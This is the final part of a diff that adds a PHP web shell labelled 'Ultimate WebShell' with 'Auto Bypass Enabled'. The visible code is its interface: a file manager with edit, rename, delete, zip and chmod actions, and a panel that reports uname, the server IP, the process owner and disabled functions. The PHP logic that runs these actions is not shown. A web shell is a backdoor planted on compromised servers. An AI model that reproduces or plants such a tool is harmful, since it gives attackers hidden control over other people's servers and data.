+                                                        <button type="button" class="btn btn-outline-warning btn-sm" onclick="showRenameModal('<?php echo htmlspecialchars($item['name']); ?>', 'file')">
+                                                            <i class="fas fa-edit"></i>
+                                                        </button>
+                                                        <button type="button" class="btn btn-outline-info btn-sm" onclick="showChmodModal('<?php echo htmlspecialchars($item['name']); ?>', '<?php echo $item['perms']; ?>')">
+                                                            <i class="fas fa-key"></i>
+                                                        </button>
+                                                        <button type="button" class="btn btn-outline-danger btn-sm" onclick="confirmDelete('<?php echo htmlspecialchars($item['name']); ?>')">
+                                                            <i class="fas fa-trash"></i>
+                                                        </button>
+                                                    </div>
+                                                <?php endif; ?>
+                                            </td>
+                                        </tr>
+                                    <?php endforeach; ?>
+                                <?php else: ?>
+                                    <tr>
+                                        <td colspan="7" class="text-center text-muted">No files or folders found</td>
+                                    </tr>
+                                <?php endif; ?>
+                            </tbody>
+                        </table>
+                    </div>
+
+                    <!-- Bulk Actions -->
+                    <div class="action-buttons" id="actionButtons" style="display: none;">
+                        <div class="row align-items-center">
+                            <div class="col-md-3">
+                                <span id="selectedCount">0</span> items selected
+                            </div>
+                            <div class="col-md-4">
+                                <select name="selected_action" class="form-select form-select-sm">
+                                    <option value="">Choose Action...</option>
+                                    <option value="delete">Delete Selected</option>
+                                    <option value="zip">Zip Selected</option>
+                                    <option value="unzip">Unzip Selected</option>
+                                </select>
+                            </div>
+                            <div class="col-md-5">
+                                <button type="submit" class="btn btn-warning btn-sm me-2">
+                                    <i class="fas fa-play"></i> Execute Action
+                                </button>
+                                <button type="button" class="btn btn-secondary btn-sm" onclick="clearSelection()">
+                                    <i class="fas fa-times"></i> Clear Selection
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+                </form>
+
+                <div class="text-muted small mt-4 text-center">
+                    &#169; Ultimate WebShell <script>document.write(new Date().getFullYear())</script> | Auto Bypass Enabled
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Modals -->
+    <!-- Create Folder Modal -->
+    <div class="modal fade" id="createFolderModal" tabindex="-1">
+        <div class="modal-dialog">
+            <div class="modal-content bg-dark text-light">
+                <div class="modal-header">
+                    <h5 class="modal-title"><i class="fas fa-folder-plus"></i> Create New Folder</h5>
+                    <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
+                </div>
+                <form method="post">
+                    <div class="modal-body">
+                        <input type="text" class="form-control" name="newFolderName" placeholder="Enter folder name" required>
+                    </div>
+                    <div class="modal-footer">
+                        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button>
+                        <button type="submit" class="btn btn-primary">Create</button>
+                    </div>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <!-- Create File Modal -->
+    <div class="modal fade" id="createFileModal" tabindex="-1">
+        <div class="modal-dialog">
+            <div class="modal-content bg-dark text-light">
+                <div class="modal-header">
+                    <h5 class="modal-title"><i class="fas fa-file-plus"></i> Create New File</h5>
+                    <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
+                </div>
+                <form method="post">
+                    <div class="modal-body">
+                        <input type="text" class="form-control mb-3" name="newFileName" placeholder="Enter file name" required>
+                        <textarea class="form-control" name="newFileContent" rows="5" placeholder="File content"></textarea>
+                    </div>
+                    <div class="modal-footer">
+                        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button>
+                        <button type="submit" class="btn btn-primary">Create</button>
+                    </div>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <!-- File View/Edit Modal -->
+    <?php if (isset($_GET['action']) && $_GET['action'] == 'view' && isset($_GET['item'])): ?>
+    <div class="modal fade show" id="fileViewModal" tabindex="-1" style="display: block; background: rgba(0,0,0,0.8);">
+        <div class="modal-dialog modal-xl">
+            <div class="modal-content bg-dark text-light">
+                <div class="modal-header">
+                    <h5 class="modal-title"><i class="fas fa-edit"></i> Edit File: <?php echo htmlspecialchars($_GET['item']); ?></h5>
+                    <a href="?dir=<?php echo urlencode($path); ?>" class="btn-close btn-close-white"></a>
+                </div>
+                <form method="post">
+                    <div class="modal-body">
+                        <input type="hidden" name="file_path" value="<?php echo htmlspecialchars($path . '/' . $_GET['item']); ?>">
+                        <textarea class="form-control font-monospace" name="file_content" rows="20" style="background: #1a1a1a; color: #00ff00;"><?php echo $file_content; ?></textarea>
+                    </div>
+                    <div class="modal-footer">
+                        <a href="?dir=<?php echo urlencode($path); ?>" class="btn btn-secondary">Cancel</a>
+                        <button type="submit" name="save_file" class="btn btn-primary">Save Changes</button>
+                    </div>
+                </form>
+            </div>
+        </div>
+    </div>
+    <?php endif; ?>
+
+    <!-- Rename Modal -->
+    <div class="modal fade" id="renameModal" tabindex="-1">
+        <div class="modal-dialog">
+            <div class="modal-content bg-dark text-light">
+                <div class="modal-header">
+                    <h5 class="modal-title"><i class="fas fa-edit"></i> Rename</h5>
+                    <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
+                </div>
+                <form method="post">
+                    <input type="hidden" name="old_name" id="oldName">
+                    <div class="modal-body">
+                        <input type="text" class="form-control" name="new_name" id="newName" required>
+                    </div>
+                    <div class="modal-footer">
+                        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button>
+                        <button type="submit" name="rename_file" class="btn btn-primary">Rename</button>
+                    </div>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <!-- Chmod Modal -->
+    <div class="modal fade" id="chmodModal" tabindex="-1">
+        <div class="modal-dialog">
+            <div class="modal-content bg-dark text-light">
+                <div class="modal-header">
+                    <h5 class="modal-title"><i class="fas fa-key"></i> Change Permissions</h5>
+                    <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
+                </div>
+                <form method="post">
+                    <input type="hidden" name="file_name" id="chmodFileName">
+                    <div class="modal-body">
+                        <input type="text" class="form-control" name="new_perm" id="newPerm" required>
+                        <small class="text-muted">Common permissions: 755 (rwxr-xr-x), 644 (rw-r--r--), 777 (rwxrwxrwx)</small>
+                    </div>
+                    <div class="modal-footer">
+                        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button>
+                        <button type="submit" name="change_perm" class="btn btn-primary">Change</button>
+                    </div>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <!-- Info Modal -->
+    <div class="modal fade" id="infoModal" tabindex="-1">
+        <div class="modal-dialog modal-lg">
+            <div class="modal-content bg-dark text-light">
+                <div class="modal-header">
+                    <h5 class="modal-title"><i class="fas fa-info-circle"></i> System Information</h5>
+                    <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
+                </div>
+                <div class="modal-body">
+                    <textarea class="form-control" rows="15" readonly style="background: #1a1a1a;">
+Uname: <?php echo function_exists('php_uname') ? php_uname() : 'Unknown'; ?>
+
+Software: <?php echo isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : 'Unknown'; ?>
+
+PHP Version: <?php echo function_exists('phpversion') ? phpversion() : 'Unknown'; ?>
+
+Protocol: <?php echo isset($_SERVER['SERVER_PROTOCOL']) ? $_SERVER['SERVER_PROTOCOL'] : 'Unknown'; ?>
+
+Server IP: <?php
+if (isset($_SERVER['SERVER_ADDR'])) {
+    echo $_SERVER['SERVER_ADDR'];
+} else {
+    echo function_exists('gethostbyname') ? gethostbyname($server_name) : 'Unknown';
+}
+?>
+
+Your IP: <?php echo $client_ip; ?>
+
+Mail: <?php echo function_exists('mail') ? 'ON' : 'OFF'; ?>
+
+Curl: <?php echo function_exists('curl_version') ? 'ON' : 'OFF'; ?>
+
+Owner: <?php echo function_exists('get_current_user') ? get_current_user() : 'Unknown'; ?>
+
+MySQL: <?php echo function_exists('mysqli_connect') ? 'ON' : 'OFF'; ?>
+
+Disabled Functions: <?php echo $ds0; ?>
+
+Auto Bypass: ENABLED
+                    </textarea>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+
+    <script>
+    // Selection functionality
+    function toggleSelectAll() {
+        const checkboxes = document.querySelectorAll('.item-checkbox');
+        const selectAll = document.getElementById('selectAll');
+        checkboxes.forEach(cb => {
+            if (!cb.disabled) {
+                cb.checked = selectAll.checked;
+            }
+        });
+        toggleActionButtons();
+    }
+
+    function toggleActionButtons() {
+        const checked = document.querySelectorAll('.item-checkbox:checked');
+        const actionButtons = document.getElementById('actionButtons');
+        const selectedCount = document.getElementById('selectedCount');
+
+        selectedCount.textContent = checked.length;
+        actionButtons.style.display = checked.length > 0 ? 'block' : 'none';
+
+        // Update row selection
+        document.querySelectorAll('.file-row').forEach(row => {
+            const checkbox = row.querySelector('.item-checkbox');
+            if (checkbox && !checkbox.disabled) {
+                row.classList.toggle('selected', checkbox.checked);
+            }
+        });
+    }
+
+    function clearSelection() {
+        document.querySelectorAll('.item-checkbox').forEach(cb => {
+            if (!cb.disabled) cb.checked = false;
+        });
+        document.getElementById('selectAll').checked = false;
+        toggleActionButtons();
+    }
+
+    // Modal functions
+    function showRenameModal(name, type) {
+        document.getElementById('oldName').value = name;
+        document.getElementById('newName').value = name;
+        new bootstrap.Modal(document.getElementById('renameModal')).show();
+    }
+
+    function showChmodModal(name, currentPerm) {
+        document.getElementById('chmodFileName').value = name;
+        document.getElementById('newPerm').value = currentPerm;
+        new bootstrap.Modal(document.getElementById('chmodModal')).show();
+    }
+
+    function confirmDelete(name) {
+        Swal.fire({
+            title: 'Are you sure?',
+            text: "You are about to delete: " + name,
+            icon: 'warning',
+            showCancelButton: true,
+            confirmButtonColor: '#d33',
+            cancelButtonColor: '#3085d6',
+            confirmButtonText: 'Yes, delete it!'
+        }).then((result) => {
+            if (result.isConfirmed) {
+                window.location.href = '?dir=<?php echo urlencode($path); ?>&action=delete&item=' + encodeURIComponent(name);
+            }
+        });
+    }
+
+    // Auto show file view modal if needed
+    <?php if (isset($_GET['action']) && $_GET['action'] == 'view'): ?>
+        document.addEventListener('DOMContentLoaded', function() {
+            const modal = new bootstrap.Modal(document.getElementById('fileViewModal'));
+            modal.show();
+        });
+    <?php endif; ?>
+
+    // SweetAlert for messages
+    <?php if (isset($_SESSION['message'])): ?>
+        Swal.fire({
+            title: '<?php echo isset($_SESSION['status']) ? $_SESSION['status'] : ''; ?>',
+            text: '<?php echo isset($_SESSION['message']) ? $_SESSION['message'] : ''; ?>',
+            icon: '<?php echo isset($_SESSION['class']) ? $_SESSION['class'] : 'info'; ?>',
+            timer: 3000
+        });
+        <?php clear(); ?>
+    <?php endif; ?>
+    </script>
+</body>
+</html>
